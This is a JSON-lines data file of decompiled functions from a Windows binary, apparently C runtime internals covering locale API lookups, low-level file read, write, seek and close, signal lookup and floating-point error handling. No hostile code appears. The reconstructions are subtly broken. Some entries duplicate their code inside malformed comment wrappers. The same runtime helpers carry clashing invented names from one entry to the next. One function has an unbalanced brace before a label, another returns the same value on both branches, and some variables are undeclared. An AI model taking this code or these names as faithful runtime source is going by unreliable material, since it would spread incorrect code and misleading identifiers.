{"Function Name": "__crt_seh_guarded_call<int>::operator()<class_<lambda_9227be29367c048ad7fd93a717dcb1a1>,class_<lambda_a463b7b0560cfcaf9b17f27c6ef46564>&,class_<lambda_ccea11b5727ccf69be64f5f5d9a08d9f>_>", "Address": "1002cd23", "Source Code": "\\*\nint __thiscall\n__crt_seh_guarded_call<int>::\noperator()<class_<lambda_9227be29367c048ad7fd93a717dcb1a1>,class_<lambda_a463b7b0560cfcaf9b17f27c6ef46564>&,class_<lambda_ccea11b5727ccf69be64f5f5d9a08d9f>_>\n(__crt_seh_guarded_call<int> *this, \n<lambda_9227be29367c048ad7fd93a717dcb1a1> *param_1, \n<lambda_a463b7b0560cfcaf9b17f27c6ef46564> *param_2, \n<lambda_ccea11b5727ccf69be64f5f5d9a08d9f> *param_3) \n{\n    BOOL BVar2; \n    ___acrt_lock(*(int *)param_1); \n    _DAT_10050390 = __crt_fast_encode_pointer<>(**(uint **)param_2); \n    BVar2 = EnumSystemLocalesW(FUN_1002cd16, 1); \n    _DAT_10050390 ^= DAT_1004e008; \n    FUN_1002cd9b(); \n    return BVar2; \n}\n*\\ \n \nint __thiscall\n__crt_seh_guarded_call<int>::\noperator()<class_<lambda_9227be29367c048ad7fd93a717dcb1a1>,class_<lambda_a463b7b0560cfcaf9b17f27c6ef46564>&,class_<lambda_ccea11b5727ccf69be64f5f5d9a08d9f>_>\n(__crt_seh_guarded_call<int> *this,<lambda_9227be29367c048ad7fd93a717dcb1a1> *param_1,\n<lambda_a463b7b0560cfcaf9b17f27c6ef46564> *param_2,\n<lambda_ccea11b5727ccf69be64f5f5d9a08d9f> *param_3)\n{\n    BOOL BVar2;\n    ___acrt_lock(*(int *)param_1);\n    _DAT_10050390 = __crt_fast_encode_pointer<>(**(uint **)param_2);\n    BVar2 = EnumSystemLocalesW(FUN_1002cd16, 1);\n    _DAT_10050390 ^= DAT_1004e008;\n    FUN_1002cd9b();\n    return BVar2;\n}"}
{"Function Name": "FUN_1002cd9b", "Address": "1002cd9b", "Source Code": "void unlock_function(void) \n{\n    \n    \n    \n    unlock_function_call(**(int **)(*(int *)0x10));\n}"}
{"Function Name": "<lambda_5a01b672d24c8480ee9d6bdb50dd3881>::<helper_func_stdcall>", "Address": "1002cdcf", "Source Code": "int <lambda_function>::<helper_function>(wchar_t *input_param)\n{\n    \n    uint xor_result_1 = global_var_1 ^ (uint)&stack0xfffffffc;\n    \n    \n    uint xor_result_2 = global_var_1 ^ global_var_2;\n    \n    \n    byte shift_amount = (byte)global_var_1 & 0x1f;\n    \n    \n    (*(code *)guard_check_function)(input_param, 0, 0);\n    \n    \n    (*(code *)(xor_result_2 >> shift_amount | xor_result_2 << 0x20 - shift_amount))();\n    \n    \n    return security_check_function(xor_result_1);\n}"}
{"Function Name": "try_get_AreFileApisANSI", "Address": "1002ce15", "Source Code": "try_get_AreFileApisANSI(void) \n{\n    \n    return (_func_int *)getFunctionAddress(0, \"AreFileApisANSI\", (module_id *)&moduleAddress, (module_id *)\"AreFileApisANSI\");\n    \n}"}
{"Function Name": "try_get_CompareStringEx", "Address": "1002ce2f", "Source Code": "try_get_CompareStringEx(void) \n{\n    \n    return (_func_int_wchar_t_ptr_ulong_wchar_t_ptr_int_wchar_t_ptr_int__nlsversioninfo_ptr_void_ptr_long *) \n           try_get_function(1, \"CompareStringEx\", (module_id *)&moduleID_100404d4, (module_id *)\"CompareStringEx\");\n           \n           \n           \n           \n           \n}"}
{"Function Name": "try_get_EnumSystemLocalesEx", "Address": "1002ce49", "Source Code": "try_get_EnumSystemLocalesEx(void)  \n{\n    \n    return (_func_int__func_int_wchar_t_ptr_ulong_long_ptr_ulong_long_void_ptr *) \n           getFunction(2, \"EnumSystemLocalesEx\", (module_id *)&dataAddress,  \n           (module_id *)\"EnumSystemLocalesEx\");  \n}"}
{"Function Name": "try_get_GetDateFormatEx", "Address": "1002ce63", "Source Code": "try_get_GetDateFormatEx(void) \n{\n    \n    return (_func_int_wchar_t_ptr_ulong__SYSTEMTIME_ptr_wchar_t_ptr_wchar_t_ptr_int_wchar_t_ptr *)\n           getFunctionAddress(8, \"GetDateFormatEx\", (module_id *)&moduleIdentifier, (module_id *)\"GetDateFormatEx\");\n           \n}"}
{"Function Name": "try_get_GetLocaleInfoEx", "Address": "1002ce7d", "Source Code": "try_get_GetLocaleInfoEx(void)  \n{\n    return (_func_int_wchar_t_ptr_ulong_wchar_t_ptr_int *)  \n           attempt_fetch_function(0xb, \"GetLocaleInfoEx\", (module_id *)&module_identifier,  \n           (module_id *)\"GetLocaleInfoEx\");  \n}"}
{"Function Name": "try_get_GetTimeFormatEx", "Address": "1002ce97", "Source Code": "try_get_GetTimeFormatEx(void)  \n{\n    return (_func_int_wchar_t_ptr_ulong__SYSTEMTIME_ptr_wchar_t_ptr_wchar_t_ptr_int *)  \n           try_get_function(0xe, \"GetTimeFormatEx\", (module_id *)&moduleData,  \n           (module_id *)\"GetTimeFormatEx\");  \n}"}
{"Function Name": "try_get_GetUserDefaultLocaleName", "Address": "1002ceb1", "Source Code": "try_get_GetUserDefaultLocaleName(void)  \n{\n    return (_func_int_wchar_t_ptr_int *)  \n           attemptRetrieveFunction(0xf, \"GetUserDefaultLocaleName\",  \n           (module_id *)&moduleIDPointer,  \n           (module_id *)\"GetUserDefaultLocaleName\");  \n}"}
{"Function Name": "try_get_IsValidLocaleName", "Address": "1002cecb", "Source Code": "try_get_IsValidLocaleName(void) \n{\n    \n    return (_func_int_wchar_t_ptr *)fetchFunction(0x13, \"IsValidLocaleName\", (module_id *)&moduleData, (module_id *)\"IsValidLocaleName\");\n}"}
{"Function Name": "try_get_LCIDToLocaleName", "Address": "1002cee5", "Source Code": "try_get_LCIDToLocaleName(void) \n{\n    \n    return (_func_int_ulong_wchar_t_ptr_int_ulong *) \n           getFunction(0x15, \"LCIDToLocaleName\", \n           (module_id *)&moduleIDAddress, \n           (module_id *)\"LCIDToLocaleName\"); \n}"}
{"Function Name": "try_get_LCMapStringEx", "Address": "1002ceff", "Source Code": "try_get_LCMapStringEx(void) \n{\n    \n    return (_func_int_wchar_t_ptr_ulong_wchar_t_ptr_int_wchar_t_ptr_int__nlsversioninfo_ptr_void_ptr_long *) \n           get_function_address( \n               0x14, \n               \"LCMapStringEx\", \n               (module_id *)&DAT_10040600, \n               (module_id *)\"LCMapStringEx\" \n           );\n}"}
{"Function Name": "try_get_LocaleNameToLCID", "Address": "1002cf19", "Source Code": "try_get_LocaleNameToLCID(void) \n{\n    \n    return (_func_ulong_wchar_t_ptr_ulong *) \n           get_function_address(0x16, \"LocaleNameToLCID\", \n           (module_id *)&module_id_pointer, \n           (module_id *)\"LocaleNameToLCID\"); \n}"}
{"Function Name": "___acrt_can_use_vista_locale_apis", "Address": "1002d4f4", "Source Code": "bool canUseVistaLocaleAPIs(void)\n{\n    \n    \n    return retrieveCompareStringEx() != NULL;\n}"}
{"Function Name": "FUN_1002d6cc", "Address": "1002d6cc", "Source Code": "void unlock_function(void)\n{\n    \n    acrt_unlock(**(int **)(*(int *)0x10));\n}"}
{"Function Name": "siglookup", "Address": "1002d742", "Source Code": "\\*\n__crt_signal_action_t * __cdecl siglookup(int signal_number, __crt_signal_action_t *signal_actions)\n{\n    \n    __crt_signal_action_t *end_pointer = signal_actions + DAT_1003ee70 * 0xc;\n    \n    \n    while (signal_actions != end_pointer) {\n        \n        if (*(int *)(signal_actions + 4) == signal_number) {\n            \n            return signal_actions;\n        }\n        \n        signal_actions += 0xc;\n    }\n    \n    \n    return (__crt_signal_action_t *)0x0;\n}\n*\\ \n \n__crt_signal_action_t * __cdecl siglookup(int signal_number, __crt_signal_action_t *signal_actions)\n{\n    __crt_signal_action_t *end_pointer = signal_actions + DAT_1003ee70 * 0xc;\n    while (signal_actions != end_pointer) {\n        if (*(int *)(signal_actions + 4) == signal_number) {\n            return signal_actions;\n        }\n        signal_actions += 0xc;\n    }\n    return (__crt_signal_action_t *)0x0;\n}"}
{"Function Name": "___acrt_get_sigabrt_handler", "Address": "1002d76a", "Source Code": "void getSigabrtHandler(void)\n{\n    \n    lockAndCall<class_<lambda_ec61778202f4f5fc7e7711acc23c3bca>_>(3, nullPointer);\n}"}
{"Function Name": "FUN_1002d7bc", "Address": "1002d7bc", "Source Code": "int calculateValue(void) \n{\n    \n    return (int)(getBaseValue() + 8);\n}"}
{"Function Name": "FUN_1002d985", "Address": "1002d985", "Source Code": "void FUN_1002d985(void)\n{\n    \n    if (*(char *)(base_pointer - 0x1d) != '\\0') {\n        \n        unlock_function(3);\n    }\n}"}
{"Function Name": "___acrt_has_user_matherr", "Address": "1002d9cd", "Source Code": "bool ___acrt_has_user_matherr(void)\n{\n    \n    \n    \n    \n    \n    \n    \n    \n    \n    return ((data1 ^ data2) >> (data1 & 0x1f) | \n            (data1 ^ data2) << (0x20 - (data1 & 0x1f))) != 0;\n}"}
{"Function Name": "___acrt_GetLocaleInfoA", "Address": "1002e108", "Source Code": "void __cdecl\n___acrt_GetLocaleInfoA\n(__crt_locale_pointers *param_1, int param_2, wchar_t *param_3, uint param_4, wchar_t **param_5)\n{\n    uint uVar1; \n    wchar_t *pwVar2; \n    int iVar3; \n    DWORD DVar4; \n    *param_5 = (wchar_t *)0x0; \n    if (param_2 == 1) { \n        uVar1 = InternalGetLocaleInfoA(param_1, param_3, param_4, local_88, 0x80); \n        if (uVar1 != 0) { \n            pwVar2 = (wchar_t *)__calloc_base(uVar1, 1); \n            *param_5 = pwVar2; \n            if ((*param_5 != (wchar_t *)0x0) && (iVar3 = FUN_10035efb((char *)*param_5, uVar1, local_88, uVar1 - 1), iVar3 != 0)) {\n                __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); \n            }\n            goto LAB_1002e29e; \n        }\n        DVar4 = GetLastError(); \n        if ((DVar4 != 0x7a) || (uVar1 = InternalGetLocaleInfoA(param_1, param_3, param_4, (char *)0x0, 0), uVar1 == 0))\n            goto LAB_1002e29e; \n        pwVar2 = (wchar_t *)__calloc_base(uVar1, 1); \n        if (pwVar2 != (wchar_t *)0x0) { \n            iVar3 = InternalGetLocaleInfoA(param_1, param_3, param_4, (char *)pwVar2, uVar1); \n            if (iVar3 != 0) { \n                *param_5 = pwVar2; \n                pwVar2 = (wchar_t *)0x0; \n            }\n        }\n    } else if (param_2 == 0) { \n        wchar_t *local_8c = (wchar_t *)0x0; \n        iVar3 = FUN_1002d288(param_3, param_4 | 0x20000000, &local_8c, 2); \n        if (iVar3 != 0) { \n            *(undefined *)param_5 = local_8c._0_1_; \n        }\n        goto LAB_1002e29e; \n    } else { \n        uVar1 = FUN_1002d288(param_3, param_4, (wchar_t *)0x0, 0); \n        if (uVar1 == 0) goto LAB_1002e29e; \n        pwVar2 = (wchar_t *)__calloc_base(uVar1, 2); \n        if (pwVar2 != (wchar_t *)0x0) { \n            iVar3 = FUN_1002d288(param_3, param_4, pwVar2, uVar1); \n            if (iVar3 != 0) { \n                *param_5 = pwVar2; \n                pwVar2 = (wchar_t *)0x0; \n            }\n        }\n    }\n    FID_conflict__free(pwVar2); \nLAB_1002e29e:\n    return; \n}"}
{"Function Name": "FUN_1002e63f", "Address": "1002e63f", "Source Code": "int FUN_1002e63f(void) \n{\n    int success_count = 0; \n    ___acrt_lock(8); \n    for (int index = 3; index != max_index; index++) { \n        int value = *(int *)(data_array + index * 4); \n        if (value != 0) { \n            if ((*(uint *)(value + 0xc) >> 0xd & 1) != 0) { \n                if (_fclose(*(FILE **)(data_array + index * 4)) != -1) { \n                    success_count++; \n                }\n            }\n            DeleteCriticalSection((critical_section)(value + 0x20)); \n            FID_conflict__free(*(void **)(data_array + index * 4)); \n            *(undefined4 *)(data_array + index * 4) = 0; \n        }\n    }\n    FUN_1002e6d6(); \n    return success_count; \n}"}
{"Function Name": "FUN_1002e6d6", "Address": "1002e6d6", "Source Code": "void unlock_function(void) \n{\n    unlock_function_call(8); \n}"}
{"Function Name": "__crt_seh_guarded_call<int>::operator()<class_<lambda_123407a5e2ac06da108355a851863b7a>,class_<lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec>&,class_<lambda_ae55bdf541ad94d75914d381c370e64d>_>", "Address": "1002e71d", "Source Code": "\\*\nint __thiscall\n__crt_seh_guarded_call<int>::\noperator()<class_<lambda_123407a5e2ac06da108355a851863b7a>,class_<lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec>&,class_<lambda_ae55bdf541ad94d75914d381c370e64d>_>\n(__crt_seh_guarded_call<int> *this,<lambda_123407a5e2ac06da108355a851863b7a> *param_1,\n<lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec> *param_2,\n<lambda_ae55bdf541ad94d75914d381c370e64d> *param_3)\n{\n    \n    uint _FileHandle = **(uint **)param_2;\n    int iVar1; \n    \n    ___acrt_lowio_lock_fh(*(uint *)param_1);\n    \n    \n    if ((*(byte *)((&DAT_10050088)[(int)_FileHandle >> 6] + 0x28 + (_FileHandle & 0x3f) * 0x30) & 1) == 0) {\n        \n        *(undefined4 *)FUN_100253b8() = 9; \n        iVar1 = -1; \n    } else {\n        \n        iVar1 = __close_nolock(_FileHandle);\n    }\n    \n    \n    FUN_1002e793();\n    return iVar1; \n}\n*\\ \n \nint __thiscall\n__crt_seh_guarded_call<int>::\noperator()<class_<lambda_123407a5e2ac06da108355a851863b7a>,class_<lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec>&,class_<lambda_ae55bdf541ad94d75914d381c370e64d>_>\n(__crt_seh_guarded_call<int> *this,<lambda_123407a5e2ac06da108355a851863b7a> *param_1,\n<lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec> *param_2,\n<lambda_ae55bdf541ad94d75914d381c370e64d> *param_3)\n{\n    uint _FileHandle = **(uint **)param_2;\n    int iVar1;\n    ___acrt_lowio_lock_fh(*(uint *)param_1);\n    \n    if ((*(byte *)((&DAT_10050088)[(int)_FileHandle >> 6] + 0x28 + (_FileHandle & 0x3f) * 0x30) & 1) == 0) {\n        *(undefined4 *)FUN_100253b8() = 9;\n        iVar1 = -1;\n    } else {\n        iVar1 = __close_nolock(_FileHandle);\n    }\n    \n    FUN_1002e793();\n    return iVar1;\n}"}
{"Function Name": "FUN_1002e793", "Address": "1002e793", "Source Code": "void unlockFileHandler(void) \n{\n    \n    lowioUnlockFunction(**(uint **)(*(int *)0x10)); \n}"}
{"Function Name": "__crt_seh_guarded_call<int>::operator()<class_<lambda_61cee617f5178ae960314fd4d05640a0>,class_<lambda_6978c1fb23f02e42e1d9e99668cc68aa>&,class_<lambda_9cd88cf8ad10232537feb2133f08c833>_>", "Address": "1002e91d", "Source Code": "\\*\nint __thiscall\n__crt_seh_guarded_call<int>::\noperator()<class_<lambda_61cee617f5178ae960314fd4d05640a0>,class_<lambda_6978c1fb23f02e42e1d9e99668cc68aa>&,class_<lambda_9cd88cf8ad10232537feb2133f08c833>_>\n(__crt_seh_guarded_call<int> *this,<lambda_61cee617f5178ae960314fd4d05640a0> *param_1,\n<lambda_6978c1fb23f02e42e1d9e99668cc68aa> *param_2,\n<lambda_9cd88cf8ad10232537feb2133f08c833> *param_3)\n{\n    \n    uint _FileHandle = **(uint **)param_2;\n    \n    if ((*(byte *)((&DAT_10050088)[(int)_FileHandle >> 6] + 0x28 + (_FileHandle & 0x3f) * 0x30) & 1) != 0) {\n        \n        HANDLE hFile = (HANDLE)__get_osfhandle(_FileHandle);\n        \n        if (FlushFileBuffers(hFile) == 0) {\n            \n            DWORD *pDVar2 = (DWORD *)FUN_100253a5();\n            *pDVar2 = GetLastError();\n            \n            *(undefined4 *)FUN_100253b8() = 9;\n            \n            return -1;\n        }\n    }\n    \n    FUN_1002e9a9();\n    \n    return 0;\n}\n*\\ \n \nint __thiscall\n__crt_seh_guarded_call<int>::\noperator()<class_<lambda_61cee617f5178ae960314fd4d05640a0>,class_<lambda_6978c1fb23f02e42e1d9e99668cc68aa>&,class_<lambda_9cd88cf8ad10232537feb2133f08c833>_>\n(__crt_seh_guarded_call<int> *this,<lambda_61cee617f5178ae960314fd4d05640a0> *param_1,\n<lambda_6978c1fb23f02e42e1d9e99668cc68aa> *param_2,\n<lambda_9cd88cf8ad10232537feb2133f08c833> *param_3)\n{\n    uint _FileHandle = **(uint **)param_2;\n    if ((*(byte *)((&DAT_10050088)[(int)_FileHandle >> 6] + 0x28 + (_FileHandle & 0x3f) * 0x30) & 1) != 0) {\n        HANDLE hFile = (HANDLE)__get_osfhandle(_FileHandle);\n        if (FlushFileBuffers(hFile) == 0) {\n            DWORD *pDVar2 = (DWORD *)FUN_100253a5();\n            *pDVar2 = GetLastError();\n            *(undefined4 *)FUN_100253b8() = 9;\n            return -1;\n        }\n    }\n    FUN_1002e9a9();\n    return 0;\n}"}
{"Function Name": "FUN_1002e9a9", "Address": "1002e9a9", "Source Code": "void unlockFileHandler(void) \n{\n    \n    lowioUnlockFile(**(uint **)(*(int *)0x10)); \n}"}
{"Function Name": "__write", "Address": "1002efee", "Source Code": "int __cdecl __write(int fileHandle, void *buffer, uint maxCharCount)\n{\n    undefined4 *tempPointer; \n    int returnValue = -1; \n    \n    if (fileHandle == -2) {\n        tempPointer = (undefined4 *)FUN_100253a5(); \n        *tempPointer = 0; \n        tempPointer = (undefined4 *)FUN_100253b8(); \n        *tempPointer = 9; \n    } \n    \n    else if ((-1 < fileHandle) && ((uint)fileHandle < DAT_10050288)) {\n        int offset = (fileHandle & 0x3fU) * 0x30; \n        \n        if ((*(byte *)((&DAT_10050088)[fileHandle >> 6] + 0x28 + offset) & 1) != 0) {\n            ___acrt_lowio_lock_fh(fileHandle); \n            \n            if ((*(byte *)((&DAT_10050088)[fileHandle >> 6] + 0x28 + offset) & 1) == 0) {\n                tempPointer = (undefined4 *)FUN_100253b8(); \n                *tempPointer = 9; \n                tempPointer = (undefined4 *)FUN_100253a5(); \n                *tempPointer = 0; \n            } else {\n                \n                returnValue = FUN_1002f0d9(fileHandle, (wchar_t *)buffer, maxCharCount);\n            }\n            FUN_1002f0b0(); \n            return returnValue; \n        }\n    }\n    \n    \n    tempPointer = (undefined4 *)FUN_100253a5(); \n    *tempPointer = 0; \n    tempPointer = (undefined4 *)FUN_100253b8(); \n    *tempPointer = 9; \n    FUN_1001de96(); \n    \n    return -1; \n}"}
{"Function Name": "FUN_1002f0b0", "Address": "1002f0b0", "Source Code": "void FUN_1002f0b0(void) \n{\n    ___acrt_lowio_unlock_fh(low_io_handle); \n}"}
{"Function Name": "FUN_1002f0d9", "Address": "1002f0d9", "Source Code": "void __cdecl FUN_1002f0d9(uint param_1, wchar_t *param_2, uint param_3)\n{\n    char characterValue; \n    bool requiresDoubleTranslation; \n    undefined4 *errorPointer; \n    DWORD *dataPointer; \n    BOOL writeFileSuccess; \n    DWORD errorCode; \n    DWORD bytesWritten; \n    ulong firstResult; \n    DWORD secondResult; \n    DWORD thirdResult; \n    wchar_t *wideString; \n    uint param3; \n    uint stackCookie; \n    \n    stackCookie = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    param3 = param_3; \n    wideString = param_2; \n    \n    if (param_3 == 0) goto LAB_1002f2e2;\n    \n    if (param_2 == (wchar_t *)0x0) {\n        errorPointer = (undefined4 *)FUN_100253a5(); \n        *errorPointer = 0; \n        errorPointer = (undefined4 *)FUN_100253b8(); \n        *errorPointer = 0x16; \n        FUN_1001de96(); \n        goto LAB_1002f2e2; \n    }\n    \n    if (((characterValue = *(char *)((&DAT_10050088)[param_1 >> 6] + 0x29 + ((param_1 & 0x3f) * 0x30))) == '\\x02') || (characterValue == '\\x01')) && ((~param_3 & 1) == 0)) {\n        errorPointer = (undefined4 *)FUN_100253a5(); \n        *errorPointer = 0; \n        errorPointer = (undefined4 *)FUN_100253b8(); \n        *errorPointer = 0x16; \n        FUN_1001de96(); \n        goto LAB_1002f2e2; \n    }\n    \n    if ((*(byte *)((&DAT_10050088)[param_1 >> 6] + 0x28 + ((param_1 & 0x3f) * 0x30)) & 0x20) != 0) {\n        __lseeki64_nolock(param_1, 0x200000000, 0); \n    }\n    \n    firstResult = 0; \n    secondResult = 0; \n    thirdResult = 0; \n    \n    requiresDoubleTranslation = write_requires_double_translation_nolock(param_1);\n    if (requiresDoubleTranslation) {\n        \n        if (characterValue == '\\0') {\n            dataPointer = (DWORD *)FUN_1002ea4c(&errorCode, param_1, (byte *)param_2, param3); \n            goto LAB_1002f26a; \n        }\n        \n        if ((byte)(characterValue - 1U) < 2) {\n            dataPointer = write_double_translated_unicode_nolock(&errorCode, param_2, param3); \n            goto LAB_1002f26a; \n        }\n    } else {\n        \n        if ((*(byte *)((&DAT_10050088)[param_1 >> 6] + 0x28 + ((param_1 & 0x3f) * 0x30)) & 0x80) == 0) {\n            errorCode = 0; \n            bytesWritten = 0; \n            writeFileSuccess = WriteFile(*(HANDLE *)((&DAT_10050088)[param_1 >> 6] + 0x18 + ((param_1 & 0x3f) * 0x30)), param_2, param3, &bytesWritten, (LPOVERLAPPED)0x0); \n            if (writeFileSuccess == 0) {\n                errorCode = GetLastError(); \n            }\n            dataPointer = &errorCode; \n        } else if (characterValue == '\\0') {\n            dataPointer = (DWORD *)write_text_ansi_nolock(&errorCode, param_1, (char *)param_2, param3); \n        } else if (characterValue == '\\x01') {\n            dataPointer = (DWORD *)write_text_utf8_nolock(&errorCode, param_1, param_2, param3); \n        } else {\n            \n            if (characterValue != '\\x02') goto LAB_1002f279; \n            dataPointer = (DWORD *)FUN_1002edd3(&errorCode, param_1, param_2, param3); \n        }\n    }\nLAB_1002f26a:\n    \n    firstResult = *dataPointer; \n    secondResult = dataPointer[1]; \n    thirdResult = dataPointer[2]; \n}\nLAB_1002f279:\n    \n    if (secondResult == 0) {\n        \n        if (firstResult == 0) {\n            \n            if (((*(byte *)((&DAT_10050088)[param_1 >> 6] + 0x28 + ((param_1 & 0x3f) * 0x30)) & 0x40) == 0) ||\n                (*(char *)param_2 != '\\x1a')) {\n                errorPointer = (undefined4 *)FUN_100253b8(); \n                *errorPointer = 0x1c; \n                errorPointer = (undefined4 *)FUN_100253a5(); \n                *errorPointer = 0; \n            }\n        } else if (firstResult == 5) {\n            errorPointer = (undefined4 *)FUN_100253b8(); \n            *errorPointer = 9; \n            errorPointer = (undefined4 *)FUN_100253a5(); \n            *errorPointer = 5; \n        } else {\n            ___acrt_errno_map_os_error(firstResult); \n        }\n    }\nLAB_1002f2e2:\n    \n    ___security_check_cookie_4(stackCookie ^ (uint)&stack0xfffffffc);\n    return; \n}"}
{"Function Name": "FUN_1002f4f2", "Address": "1002f4f2", "Source Code": "void unlockFileFunction(void) \n{\n    \n    \n    \n    __unlock_file(*(FILE **)(*(int *)0 + 8));\n}"}
{"Function Name": "FUN_1002f681", "Address": "1002f681", "Source Code": "char __cdecl FUN_1002f681(char input_value)\n{\n    \n    return (input_value == '\\x01' || input_value == '\\x02') ? \n           \n           '\\x02' : \n           \n           '\\x01';\n}"}
{"Function Name": "__read", "Address": "1003010b", "Source Code": "int __cdecl __read(int file_handle, void *destination_buffer, uint max_character_count)\n{\n    undefined4 *error_pointer; \n    int read_result; \n    \n    if (file_handle == -2) {\n        error_pointer = (undefined4 *)FUN_100253a5(); \n        *error_pointer = 0; \n        error_pointer = (undefined4 *)FUN_100253b8(); \n        *error_pointer = 9; \n        return -1; \n    }\n    \n    if ((-1 < file_handle) && ((uint)file_handle < DAT_10050288)) {\n        \n        if (max_character_count < 0x80000000) {\n            ___acrt_lowio_lock_fh(file_handle); \n            \n            if ((*(byte *)((&DAT_10050088)[file_handle >> 6] + 0x28 + ((file_handle & 0x3fU) * 0x30)) & 1) == 0) {\n                error_pointer = (undefined4 *)FUN_100253b8(); \n                *error_pointer = 9; \n                error_pointer = (undefined4 *)FUN_100253a5(); \n                *error_pointer = 0; \n                FUN_1001de96(); \n                return -1; \n            }\n            \n            read_result = __read_nolock(file_handle, destination_buffer, max_character_count);\n            FUN_100301f5(); \n            return read_result; \n        }\n        \n        error_pointer = (undefined4 *)FUN_100253a5(); \n        *error_pointer = 0; \n        error_pointer = (undefined4 *)FUN_100253b8(); \n        *error_pointer = 0x16; \n        goto LAB_10030210; \n    }\n    \n    error_pointer = (undefined4 *)FUN_100253a5(); \n    *error_pointer = 0; \n    error_pointer = (undefined4 *)FUN_100253b8(); \n    *error_pointer = 9; \nLAB_10030210:\n    FUN_1001de96(); \n    return -1; \n}"}
{"Function Name": "FUN_100301f5", "Address": "100301f5", "Source Code": "void unlockLowLevelIOHandle(void) \n{\n    unlockLowLevelIO(0); \n}"}
{"Function Name": "common_lseek<__int64>", "Address": "100305d3", "Source Code": "\\*\n__int64 __cdecl common_lseek<__int64>(int file_descriptor, __int64 offset, int whence)\n{\n    __int64 result; \n    \n    if (file_descriptor == -2) {\n        *(undefined4 *)FUN_100253a5() = 0; \n        *(undefined4 *)FUN_100253b8() = 9; \n    }\n    \n    else if ((-1 < file_descriptor) && ((uint)file_descriptor < DAT_10050288)) {\n        int offset_index = (file_descriptor & 0x3fU) * 0x30; \n        \n        if ((*(byte *)((&DAT_10050088)[file_descriptor >> 6] + 0x28 + offset_index) & 1) != 0) {\n            ___acrt_lowio_lock_fh(file_descriptor); \n            result = common_lseek_nolock<__int64>(file_descriptor, offset, 0); \n            FUN_100306ab(); \n            return result; \n        }\n        *(undefined4 *)FUN_100253b8() = 9; \n        *(undefined4 *)FUN_100253a5() = 0; \n    }\n    *(undefined4 *)FUN_100253a5() = 0; \n    *(undefined4 *)FUN_100253b8() = 9; \n    FUN_1001de96(); \n    return -1; \n}\n*\\ \n \n__int64 __cdecl common_lseek<__int64>(int file_descriptor,__int64 offset,int whence)\n{\n    __int64 result;\n    if (file_descriptor == -2) {\n        *(undefined4 *)FUN_100253a5() = 0;\n        *(undefined4 *)FUN_100253b8() = 9;\n    }\n    else if ((-1 < file_descriptor) && ((uint)file_descriptor < DAT_10050288)) {\n        int offset_index = (file_descriptor & 0x3fU) * 0x30;\n        if ((*(byte *)((&DAT_10050088)[file_descriptor >> 6] + 0x28 + offset_index) & 1) != 0) {\n            ___acrt_lowio_lock_fh(file_descriptor);\n            result = common_lseek_nolock<__int64>(file_descriptor,offset,0);\n            FUN_100306ab();\n            return result;\n        }\n        *(undefined4 *)FUN_100253b8() = 9;\n        *(undefined4 *)FUN_100253a5() = 0;\n    }\n    *(undefined4 *)FUN_100253a5() = 0;\n    *(undefined4 *)FUN_100253b8() = 9;\n    FUN_1001de96();\n    return -1;\n}"}
{"Function Name": "FUN_100306ab", "Address": "100306ab", "Source Code": "void unlockLowLevelIOHandle(void) \n{\n    unlockLowLevelIOHandleByFD(0); \n}"}
{"Function Name": "FUN_100308a0", "Address": "100308a0", "Source Code": "void FUN_100308a0(void) \n{\n    float10 inputValue1; \n    float10 inputValue2; \n    \n    FUN_100308b9((double)inputValue2, (double)inputValue1, (uint)((ulonglong)(double)inputValue1 >> 0x20));\n    return; \n}"}
{"Function Name": "__startOneArgErrorHandling", "Address": "100317d7", "Source Code": "float10 __fastcall\n__startOneArgErrorHandling\n(undefined4 param_1, int param_2, ushort param_3, undefined4 param_4, undefined4 param_5,\nundefined4 param_6)\n{\n    int local_24; \n    __87except(param_2, &local_24, &param_3); \n    return (float10)in_ST0; \n}"}
{"Function Name": "FUN_1003184c", "Address": "1003184c", "Source Code": "undefined4 FUN_1003184c(void)\n{\n    \n    if ((eax_register & 0x80000) != 0) {\n        \n        return 0;\n    }\n    \n    return 0;\n}"}
{"Function Name": "FUN_100318a8", "Address": "100318a8", "Source Code": "uint __cdecl FUN_100318a8(undefined4 input_param, uint value)\n{\n    \n    return (value & 0x7ff00000) != 0x7ff00000 ? \n        \n        value & 0x7ff00000 : \n        \n        value;\n}"}
{"Function Name": "__math_exit", "Address": "100318cb", "Source Code": "void __fastcall\n__math_exit(undefined4 param_1, int param_2, undefined4 param_3, undefined4 param_4, undefined4 param_5)\n{\n    ushort in_FPUStatusWord; \n    ushort unaff_retaddr;    \n    \n    \n    \n    if (((unaff_retaddr != 0x27f) && ((unaff_retaddr & 0x20) != 0)) &&\n        ((in_FPUStatusWord & 0x20) != 0)) {\n        \n        \n        __startOneArgErrorHandling(param_1, param_2, unaff_retaddr, param_3, param_4, param_5);\n    }\n}"}
{"Function Name": "FUN_100319ac", "Address": "100319ac", "Source Code": "undefined4 __cdecl FUN_100319ac(double param_1)\n{\n    uint classification; \n    float10 intermediateValue; \n    float10 paramAsFloat10; \n    float10 anotherIntermediateValue; \n    \n    classification = __fpclass(param_1); \n    if ((classification & 0x90) == 0) { \n        intermediateValue = FUN_100364fd(param_1); \n        paramAsFloat10 = (float10)param_1; \n        \n        \n        if ((NAN(paramAsFloat10) || NAN(intermediateValue)) != (paramAsFloat10 == intermediateValue)) {\n            intermediateValue = (float10)_DAT_10048570; \n            anotherIntermediateValue = FUN_100364fd((double)(paramAsFloat10 * intermediateValue)); \n            intermediateValue = (float10)(double)(paramAsFloat10 * intermediateValue); \n            \n            \n            if ((NAN(intermediateValue) || NAN(anotherIntermediateValue)) != (intermediateValue == anotherIntermediateValue)) {\n                return 2; \n            }\n            return 1; \n        }\n    }\n    return 0; \n}"}
